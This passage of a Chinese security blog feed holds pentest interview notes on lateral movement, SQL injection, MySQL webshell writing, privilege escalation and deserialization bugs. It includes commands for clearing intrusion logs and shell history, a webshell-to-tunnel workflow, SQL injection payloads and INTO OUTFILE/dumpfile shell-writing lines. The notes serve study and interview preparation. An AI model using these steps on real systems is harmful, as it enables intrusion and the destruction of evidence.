title="内网135端口具体有哪些利用方式？"></a>内网135端口具体有哪些利用方式？</h5><p>爆破用户、wmic执行命令进行横向</p><h5 id="怎么做域控定位？"><a href="#怎么做域控定位？" class="headerlink" title="怎么做域控定位？"></a>怎么做域控定位？</h5><p><strong>cmd定位</strong>：<br>net group “Domain controllers” /Domain //查询域控<br>net time /domain//方式来定位域控，显示域控时间<br><strong>DNS解析记录定位</strong>：<br><code>nslookup -type=all _ldap._tcp.dc._msdcs.tubai.com</code><br>若当前主机dns为域内dns，则可以通过解析记录定位端口探测定位：扫描内网中同时开放<code>389</code>、<code>636</code>与<code>53</code>的机器，<code>389</code>默认是<code>LDAP</code>协议端口，<code>636</code>端口是<code>LDAPS</code>，<code>53</code>端口默认是DNS端口，主要用于域名解析，通过DNS服务器可以实现域名与ip地址之间转换，他们都是域控机器开放的端口<br><strong>SPN扫描定位</strong>：由于<code>SPN</code>本身就是正常的<code>kerberos</code>请求，所以扫描隐蔽，它不同于<code>TCP</code>与<code>UDP</code>常规端口扫描。大部分windows已经自带<code>setspn.exe</code>，且此操作无需管理权限<br>命令：setspn -T tubai.com -Q /<br>扫描结果中根据：<code>CN=AD-SERVER,OU=Domain Controllers,DC=tubai,DC=com</code>来进行域控的定位</p><h5 id="域管定位"><a href="#域管定位" class="headerlink" title="域管定位"></a>域管定位</h5><p>net group “Domain Admins” /domain //查询域管理员<br>此外还可以通过一些工具定位：PSloggedon.exe、PVefindaduser.exe、powerView.ps1</p><h5 id="mimikatz是从哪个进程抓hash"><a href="#mimikatz是从哪个进程抓hash" class="headerlink" title="mimikatz是从哪个进程抓hash?"></a>mimikatz是从哪个进程抓hash?</h5><p>mimikatz是从哪个进程抓hash?</p><h5 id="win2012-无法破解hash-怎么上桌面"><a href="#win2012-无法破解hash-怎么上桌面" class="headerlink" title="win2012 无法破解hash 怎么上桌面?"></a>win2012 无法破解hash 怎么上桌面?</h5><p>hash pth传递</p><h5 id="入侵Linux服务器后需要清除哪些日志？"><a href="#入侵Linux服务器后需要清除哪些日志？" class="headerlink" title="入侵Linux服务器后需要清除哪些日志？"></a>入侵Linux服务器后需要清除哪些日志？</h5><p>web日志，如 apache 的 access.log,error.log。<br>直接将日志清除过于明显,一般使用sed 进行定向清除<code>sed -i -e ‘/192.169.1.1/d’</code><br>history 命令的清除，也是对~/.bash_history 进行定向清除<br>wtmp日志的清除   /var/log/wtmp<br>登录日志清除   /var/log/secure</p><h5 id="内网渗透要怎么做？"><a href="#内网渗透要怎么做？" class="headerlink" title="内网渗透要怎么做？"></a>内网渗透要怎么做？</h5><p>第一种方法：<br>在具备Webshell的情况下，通过Webshell直接上传CS木马到对方服务器运行，在CS软件上面开启 SocksProxy代理，把 kail 直接通过cs socksProxy代理攻击内网进行横向渗透。<br>第二种方法：<br>通过reGeorg+Proxifie进行内网渗透，把 tunnel.nosocket.php 脚本通过Webshell上传到 Web 站点目录进行访问，在本地自己电脑上面执行<code>reGeorgSocksProxy.py -p 9999 –u http://IP 地址/tunnel.nosocket.php</code>，最后配置 Proxifier 本地代理地址与端口进行横向内网渗透。</p><h5 id="内网横向渗透的一些攻击技巧"><a href="#内网横向渗透的一些攻击技巧" class="headerlink" title="内网横向渗透的一些攻击技巧"></a>内网横向渗透的一些攻击技巧</h5><ul><li>通过 nmap、nessus 扫描整个内网 ip 主机漏洞</li></ul><pre><code>ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝2代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi</code></pre><ul><li>通过 nmap 扫内网 Web 站点端口，手动或自动进行漏洞检测</li></ul><pre><code>注入、命令执行、反序列化、文件上传、弱口令等</code></pre><ul><li>通过 ntscan、Bruter、hydra 工具对内网弱口令探测，同时很可能存在密码复用现象</li><li>适当的对内网主机进行 ARP 抓取密码</li><li>如果内网有 AD 域的情况下，可以通过 MS14-068 漏洞、黄金票据、白银票据进行域控攻击，拿下域控就等于基本拿下整个内网</li></ul><h5 id="windows-cmd如何下载文件？"><a href="#windows-cmd如何下载文件？" class="headerlink" title="windows cmd如何下载文件？"></a>windows cmd如何下载文件？</h5><ol><li>certutil.exe</li><li>powershell</li><li>bitsadmin</li><li>vbs</li><li>ftp</li></ol><h5 id="怎么隐藏攻击痕迹？"><a href="#怎么隐藏攻击痕迹？" class="headerlink" title="怎么隐藏攻击痕迹？"></a>怎么隐藏攻击痕迹？</h5><ol><li>跳板</li><li>代理服务器</li><li>Tor</li><li>日志</li><li>清除历史记录</li><li>粉碎文件</li></ol><h5 id="Hash和NTML-hash区别？"><a href="#Hash和NTML-hash区别？" class="headerlink" title="Hash和NTML hash区别？"></a>Hash和NTML hash区别？</h5><p>NTLM Hash（NT LAN Manager）是支持Net NTLM认证协议及本地认证过程中的一个重要参数。其长度为32位，由数字与字母组成。<br>ntml hash生成方式是将明文口令转换成十六进制的格式 转换成Unicode格式，即在每个字节之后添加0x00对Unicode字符串作MD4加密，生成32位十六进制数字串</p><h5 id="内网中的信息收集技术"><a href="#内网中的信息收集技术" class="headerlink" title="内网中的信息收集技术"></a>内网中的信息收集技术</h5><pre><code>【主机信息收集】1. 网络配置 ipconfig /all2. 操作系统 systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;3. 软件信息 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;4. 服务信息 wmic /namespace:\root\securitycenter2 pathantivirusproduct GET displayName,productState,pathToSignedProductExe5. 用户列表 net user6. 本地管理员信息 net localgroup administrators7. 端口信息 netstat –ano8. 补丁信息 wmic qfe get Caption,Description,HotFixID,InstalledOn9. 查防火墙 netsh firewall show config【域内信息收集】是否有域：使用ipconfig /all命令可以查看网关IP地址、DNS的IP地址以及判断当前主机是否在域内：通过反 向解析查询命令nslookup来解析域名的IP地址，使用解析出来的IP地址进行对比，判断域控制器和 DNS服务器是否在同一台服务器上登录域信息：net config workstationICMP探测内网：for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I | findstr &quot;TTL=&quot;ARP探测内网：端口信息收集：查询域信息：net view /domain查询域主机：net view /domain:XXX查询域用户：net group /domain查找域控：Nslookup -type=SRV _ldap._tcp net time /domain net group &quot;Domain Controllers&quot; /domain查域用户信息：net user /domain查询域管理员：net group &quot;Domain Admins&quot; /domain查询域sid信息：whoami /all</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阅经题总结</title>
      <link href="/2023/08/01/%E9%98%85%E7%BB%8F%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2023/08/01/%E9%98%85%E7%BB%8F%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h5 id="拿到目标站以后的渗透思路？"><a href="#拿到目标站以后的渗透思路？" class="headerlink" title="拿到目标站以后的渗透思路？"></a>拿到目标站以后的渗透思路？</h5><p>渗透测试流程：</p><ol><li>项目前期准备工作</li><li>信息收集：whois、网站源IP、开放端口、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙WAF</li><li>自动化漏洞扫描：Nessus, AWVS，XRAY</li><li>手动挖掘：逻辑漏洞</li><li>验证漏洞</li><li>修复建议</li><li>（如果有）基线检查/复验漏洞</li><li>输出报告</li></ol><h5 id="如何绕过CDN查真实IP？"><a href="#如何绕过CDN查真实IP？" class="headerlink" title="如何绕过CDN查真实IP？"></a>如何绕过CDN查真实IP？</h5><ol><li>多地ping看是否有cdn（基本上非洲的那些ping就是真的了）</li><li>邮件订阅或者rss订阅（QQ邮箱的ip溯源）</li><li>二级域名可能不会做cdn</li><li>nslookup <a href="http://xxx.com/">http://xxx.com</a> 国外dns</li></ol><h5 id="sleep函数被禁用后怎么进行sql注入？"><a href="#sleep函数被禁用后怎么进行sql注入？" class="headerlink" title="sleep函数被禁用后怎么进行sql注入？"></a>sleep函数被禁用后怎么进行sql注入？</h5><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句（例如MD5）使数据库查询时间变长，从而达到延时注入的效果。</p><pre><code>AND (SELECT count(*) FROM information_schema.columns A,information_schema.columns B, information_schema.SCHEMATA C);</code></pre><h5 id="哪些地方存在xxe？架构问题？"><a href="#哪些地方存在xxe？架构问题？" class="headerlink" title="哪些地方存在xxe？架构问题？"></a>哪些地方存在xxe？架构问题？</h5><p><strong>xxe常见场景</strong><br>pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。<br><strong>xxe危害</strong><br>读取本地文件，执行系统命令，探测内网端口，攻击内网服务<br>探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定，file http ftp是常用的<br><strong>防范</strong><br>python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml<br>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析<br>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：<br>javax.xml.stream.XMLStreamReader;<br>javax.xml.parsers.DocumentBuilderFactory;</p><h5 id="如何绕过Http-only？"><a href="#如何绕过Http-only？" class="headerlink" title="如何绕过Http-only？"></a>如何绕过Http-only？</h5><p>HTTP-Only禁止的是JS读取cookie信息，Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄露</p><h5 id="SQL二次注入？"><a href="#SQL二次注入？" class="headerlink" title="SQL二次注入？"></a>SQL二次注入？</h5><p>第一次进行数据库插入数据的时候，仅仅只是使用了<code>addslashes</code>或者是借助<code>get_magic_quotes_gpc</code>对其中的特殊字符进行了转义，在写入数据库的时候还是保留了<br>原来的数据，但是数据本身还是脏数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>一些交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1=1确定注入点，用order by探测列数，union select探测输出点是第几列，</p><ol><li>爆库 <code>group_concat(schema_name) from information_schema.schemata</code></li><li>爆表 <code>group_concat(table_name) from information_schema.schemata where table_schema=&#39;hhh&#39;</code></li><li>获取数据 <code>concat(flag) from flag</code><br>修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。</li></ol><h5 id="SQLserver提权"><a href="#SQLserver提权" class="headerlink" title="SQLserver提权?"></a>SQLserver提权?</h5><p><strong>xp_cmdshell提权</strong><br>xp_cmdshell是Sql Server中的一个组件，可以用来执行系统命令,在拿到sa口令之后，经常可以通过xp_cmdshell来进行提权<br>前提：<br>getshell或者存在sql注入并且能够执行命令。<br>sql server是system权限，sql server默认就是system权限<br><strong>sp_oacreate提权</strong><br>在xp_cmdshell被删除或者出错情况下，可以充分利用SP_OACreate进行提权<br>前提：<br>需要同时具备sp_oacreate和sp_oamethod两个功能组件</p><h5 id="GPC是什么？GPC之后怎么绕过？"><a href="#GPC是什么？GPC之后怎么绕过？" class="headerlink" title="GPC是什么？GPC之后怎么绕过？"></a>GPC是什么？GPC之后怎么绕过？</h5><p>如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染</p><h5 id="如何防范webshell"><a href="#如何防范webshell" class="headerlink" title="如何防范webshell?"></a>如何防范webshell?</h5><p>防范的措施大概有三种:</p><ul><li>将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。</li><li>匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。</li><li>将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。</li><li>干脆只能局域网访问，做个隔离谁都看不到</li></ul><h5 id="webshell检查思路？"><a href="#webshell检查思路？" class="headerlink" title="webshell检查思路？"></a>webshell检查思路？</h5><p>首先，通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在<strong>应用层进行检测</strong>。<br>黑客不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是<strong>静态特征检测</strong>。<br>webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是<strong>动态特征检测</strong>。</p><p>【静态检测】<br>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法。<br>优点是快速方便，对已知的webshell查找准确率高，部署方便。<br>缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。</p><p>【静态检测配合人工】<br>一个检查工具 <a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>【动态检测】<br>Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。<br>如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。<br>Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。<br>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p><p>【日志检测】<br>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页<br>面的访问数据和数据提交记录。<br>日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测</p><p>【寻找webshell】<br>1.自动化查找：D盾 河马 fotify<br>2.手动查找：windows sublime 全文件夹查找 IDE PHPSTORM 全局查找<br>Linux 命令查找 <code>grep -rn &quot;eval(&quot; *</code><br>webshell特征 PHP的危险函数<br>还有<code>phar &lt;?php XXXXX</code></p><h5 id="见过哪些登录页面的漏洞？"><a href="#见过哪些登录页面的漏洞？" class="headerlink" title="见过哪些登录页面的漏洞？"></a>见过哪些登录页面的漏洞？</h5><p>注入点以及万能密码（分jsp，php等页面的万能密码）<br>敏感信息泄露（未授权，文件路径）<br>越权漏洞（多是框架编写问题）<br>验证码绕过<br>无限注册帐号<br>任意密码重置<br>明文传输</p><h5 id="如何快速判定XSS类型？"><a href="#如何快速判定XSS类型？" class="headerlink" title="如何快速判定XSS类型？"></a>如何快速判定XSS类型？</h5><p>存储型XSS：<br>你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；<br>反射型XSS：<br>你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；<br>DOM型XSS：<br>你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；<br>CSP策略：浏览器内容安全策略，减少xss攻击。</p><h5 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h5><ul><li>CSRF是跨站请求伪造攻击，由客户端发起</li><li>SSRF是服务器端请求伪造，由服务器发起</li><li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li></ul><h5 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h5><ol><li>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。</li></ol><p><strong>修复方式</strong>：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。<br>2. CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。<br><strong>修复方式</strong>：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.<br>3. XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。<br><strong>修复方式</strong>：XML解析库在调用时严格禁止对外部实体的解析。</p><h5 id="mysql的网站，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站，5-0以上和5-0以下有什么区别？" class="headerlink" title="mysql的网站，5.0以上和5.0以下有什么区别？"></a>mysql的网站，5.0以上和5.0以下有什么区别？</h5><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br>5.0以下是多用户单操作，5.0以上是多用户多操作</p><h5 id="关于MySQL写shell的问题"><a href="#关于MySQL写shell的问题" class="headerlink" title="关于MySQL写shell的问题"></a>关于MySQL写shell的问题</h5><p><del>妈了个逼的怎么这么喜欢问这方面的东西</del><br>1.写shell用什么函数？</p><ul><li><code>select &#39;&lt;?php phpinfo()&gt; into outfile &#39;D:/shelltest.php&#39;</code></li><li><code>dumpfile</code></li><li><code>file_put_contents</code></li></ul><p>2.outfile不能用了怎么办？<br><code>select unhex(&#39;udf.dll hex code&#39;) intodumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code>这样子可以UDF提权</p><p>3.dumpfile和outfile有什么不一样？<br>outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</p><p>4.sleep()能不能写shell？<br>SLEEP()函数本身并不能获取shell，但是可以联动其它漏洞获取shell</p><p>5.写shell的条件？</p><ul><li>用户权限</li><li>目录读写权限</li><li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞<br>其中<code>open_basedir</code>: 将用户可操作的文件限制在某目录下</li></ul><p>6.mysql写shell的条件？</p><ul><li>网站可访问路径的绝对路径</li><li>secure_file_priv 的值非NULL或包含了导出的绝对路径</li><li>mysql服务有对网站可访问路径的写权限</li><li>mysql连接用户有FILE权限/ROOT用户或ROOT权限</li><li>GPC关闭//未对闭合用的引号转义<br>secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出<br>Mysql&gt;=5.5.53 默认为NULL，即默认禁止导入导出<br>Mysql&lt;5.5.53 默认为空，即默认无限制<br>outfile 和 dumpfile的路径不支持hex，必须有引号包裹</li></ul><p>7.mysql日志写shell的条件？<br>与导出函数写Shell相比，规避了 secure_file_priv 的限制</p><ol><li>网站可访问路径的绝对路径</li><li>mysql服务有对网站可访问路径的写权限</li><li>mysql连接用户有权限开启日志记录和更换日志路径/ROOT权限</li><li>GPC关闭/未对闭合用的引号转义<br>虽然日志路径可以hex编码，但被记入日志的查询语句中的shell内容需要引号包裹，加<code>\</code>后传到数据库执行会报错，无法记录进日志</li></ol><p>8.disable_functions 怎么绕过？</p><ol><li>黑名单总有漏网之鱼，多尝试一些函数</li><li>LD_PRELOAD：原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令等敏感操作</li><li>lmageMagick：利用lmageMagick命令执行漏洞（CVE-2016-3714）</li><li>Windows系统组件COM绕过</li><li>PHP7.4 FFI绕过</li><li>利用Bash破壳（CVE-2014-6271）漏洞绕过</li><li>利用imap_open()绕过（CVE-2018-19518）</li><li>利用pcntl插件绕过</li></ol><p>9.Mysql有几种提权方式？<br>【Mysql_UDF 提权】<br>利用了root高权限，创建带有调用 cmd 的函数的 udf.dll 动态链接库<br>导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd<br>限制条件：</p><ol><li>MySQL 数据库没有开启安全模式（确认secure_file_priv=’’是否为空）</li><li>已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。</li><li>shell有写入到数据库安装目录的权限。<br>【MOF提权】<br>基本上在Windows Server 2003的环境下才可以成功。<br>原理是C:/Windows/system32/wbem/mof/目录下的mof文件每隔几秒钟左右都会被系统执行，因为这个 MOF 里面有一部分是 VBS脚本，所以可以利用这个VBS脚本来调用CMD来执行系统命令，如果 MySQL有权限操作 mof 目录的话，就可以来执行任意命令了。<br>【反弹端口连接提权】<br>需要一个root弱密码，并且可以外连</li></ol><p>10.报错注入的函数有哪些？</p><pre><code>updatexml、extractvalue、floor、exp</code></pre><h5 id="拿到webshell不出网情况下怎么办？"><a href="#拿到webshell不出网情况下怎么办？" class="headerlink" title="拿到webshell不出网情况下怎么办？"></a>拿到webshell不出网情况下怎么办？</h5><p>reg上传去正向连接。或探测出网协议，如dns，icmp</p><h5 id="知不知道脏牛提权漏洞？"><a href="#知不知道脏牛提权漏洞？" class="headerlink" title="知不知道脏牛提权漏洞？"></a>知不知道脏牛提权漏洞？</h5><p>Linux内核 &gt;= 2.6.22的内存子系统在处理写入复制时产生了竞争条件（race condition）。<br>恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。<br>利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限</p><h5 id="sqlmap的–level和–risk的区别？"><a href="#sqlmap的–level和–risk的区别？" class="headerlink" title="sqlmap的–level和–risk的区别？"></a>sqlmap的–level和–risk的区别？</h5><p>level级别越高发送的请求越多，并且在level3以上时会尝试对referer注入。<br>而risk则是风险系数，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的QL注入测试。</p><h5 id="MYSQL-数据库的站，只有一个-80-端口开放？"><a href="#MYSQL-数据库的站，只有一个-80-端口开放？" class="headerlink" title="MYSQL 数据库的站，只有一个 80 端口开放？"></a>MYSQL 数据库的站，只有一个 80 端口开放？</h5><p>做了站库分离；更改了端口使3306端口不对外开放。</p><h5 id="3389-无法连接是什么情况？"><a href="#3389-无法连接是什么情况？" class="headerlink" title="3389 无法连接是什么情况？"></a>3389 无法连接是什么情况？</h5><ul><li>没开放 3389 端口</li><li>端口被修改</li><li>防护拦截</li><li>处于内网(需进行端口转发)</li></ul><h5 id="上传图片可以正常访问，上传脚本格式访问则403怎么办？"><a href="#上传图片可以正常访问，上传脚本格式访问则403怎么办？" class="headerlink" title="上传图片可以正常访问，上传脚本格式访问则403怎么办？"></a>上传图片可以正常访问，上传脚本格式访问则403怎么办？</h5><p>有可能Web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过。</p><h5 id="token和refer横向对比-谁安全等级高？"><a href="#token和refer横向对比-谁安全等级高？" class="headerlink" title="token和refer横向对比 谁安全等级高？"></a>token和refer横向对比 谁安全等级高？</h5><p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS 跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。<br>但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p><h5 id="代码执行、文件读取、命令执行函数有哪些？"><a href="#代码执行、文件读取、命令执行函数有哪些？" class="headerlink" title="代码执行、文件读取、命令执行函数有哪些？"></a>代码执行、文件读取、命令执行函数有哪些？</h5><pre><code>建议熟背一下！1）代码执行：eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function2）文件读取：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(),fgets(),parse_ini_file(),show_source(),file()等3)命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(),popen(),proc_open()</code></pre><h5 id="为什么aspx木马权限比asp大？"><a href="#为什么aspx木马权限比asp大？" class="headerlink" title="为什么aspx木马权限比asp大？"></a>为什么aspx木马权限比asp大？</h5><p>aspx使用的是.net技术。IIS中默认不支持，ASP只是脚本语言而已。<br>入侵的时候asp的木马一般是guest权限而APSX的木马一般是users权限。</p><h5 id="提权为何选择可读写目录？不用带空格的目录？"><a href="#提权为何选择可读写目录？不用带空格的目录？" class="headerlink" title="提权为何选择可读写目录？不用带空格的目录？"></a>提权为何选择可读写目录？不用带空格的目录？</h5><p>因为exp执行多半需要空格界定参数</p><h5 id="持续更新中……"><a href="#持续更新中……" class="headerlink" title="持续更新中……"></a>持续更新中……</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>护网面试总结</title>
      <link href="/2023/07/31/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>/2023/07/31/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h5 id="首先看简历"><a href="#首先看简历" class="headerlink" title="首先看简历"></a>首先看简历</h5><p>简历不要乱吹，会什么就写什么；<br>只要你写在简历上的面试官都会着重问。</p><h5 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h5><p>基本上第一句是先让你做个自我介绍<br>你说的东西后面一定会问下去，所以建议说点项目或者设备的东西，先不要这么快上强度。</p><h5 id="判断恶意外连-分析威胁情报"><a href="#判断恶意外连-分析威胁情报" class="headerlink" title="判断恶意外连/分析威胁情报"></a>判断恶意外连/分析威胁情报</h5><ol><li>首先外连是从内到外</li><li>查看外连使用的协议</li><li>查看ip，看流量，看告警分析，看返回包、状态码</li></ol><h5 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h5><p><strong>Log4j</strong><br>Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。<br>该漏洞主要是由于日志在打印时当遇到<code>$&#123;</code>后，以<code>:</code>号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。</p><p>核心原理为，通过Lookup接口+LADP，从服务器请求下载了存在恶意payload的class文件，由于日志检测时，存在${则触发替换机制，导致了表达式被替换成了lookup查找到的恶意payload，在请求过程中被实例化解析执行了。</p><p>日志在打印时当遇到<code>$&#123;</code>后，Interpolator类以<code>:</code>号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过prefix去找对应的 lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行。</p><p>JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。</p><p><strong>Shiro</strong><br>shiro提供记住密码功能<br>Payload产生的过程：命令=》序列化=》AES加密=》base64编码=》RememberMe Cookie值<br>利用：用生成的Payload，构造数据包，伪造cookie发送payload<br>【SHIRO-550】<br>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：<br>得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化<br>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞<br>【SHIRO-721】<br>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的<br>RememberMe cookie即可完成攻击<br>【两者区别】<br>shiro550使用可以使用已知密钥碰撞，但是shiro721由系统随机生成<br>550先验证”rememberMe” Cookie的值，再进行身份验证，因此可以绕过身份认证达成未授权访问<br>721登录时先进行身份验证，再验证”rememberMe” Cookie的值，所以需要一个可用的会话来利用<br>最后：shiro登录流程可以自定义</p><p><strong>weblogic</strong><br>weblogic就是把java应用程序运行起来，并提供服务的一种程序。</p><ol><li>weblogic控制台的7001端口，默认会开启T3协议服务，T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</li><li>weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</li></ol><p><strong>fastjson</strong><br>正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断<br>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数<br>【无回显怎么办】</p><ol><li>一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</li><li>通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</li><li>直接将命令执行结果回显到请求Poc的HTTP响应中</li></ol><p><strong>Jboss</strong><br>Jboss是一个管理EJB的容器和服务器。<br>下面是三个JBoss反序列化漏洞：<br>漏洞存在/jbossmq-httpil/HTTPServerILServlet中<br>漏洞存在/invoker/readonly中<br>漏洞存在/invoker/JMXInvokerServlet中<br>程序获取http请求数据保存到httpRequest中，进一步处理后保存到变量ois中，然后程序没有对该数据进行过滤，直接使用readObject()方法进行反序列化。</p><p><strong>Python</strong><br>Python内置了很多序列化/反序列化的方式，最常用的有json、pickle、marshal这三种。<br>json较为安全，因为它序列化后的字符串长度最小。<br>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。<strong>reduce</strong>()类似与PHP中的wakeup，在反序列化的时候会自动调用。<br>防御：<br>1、用更高级的接口__getnewargs()、getstate()、setstate()等代替reduce()魔术方法；<br>2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</p><p><strong>PHP</strong><br>以前的文章已经做出说明，不再重复叙述。</p><h5 id="有哪些常见的框架-中间件漏洞"><a href="#有哪些常见的框架-中间件漏洞" class="headerlink" 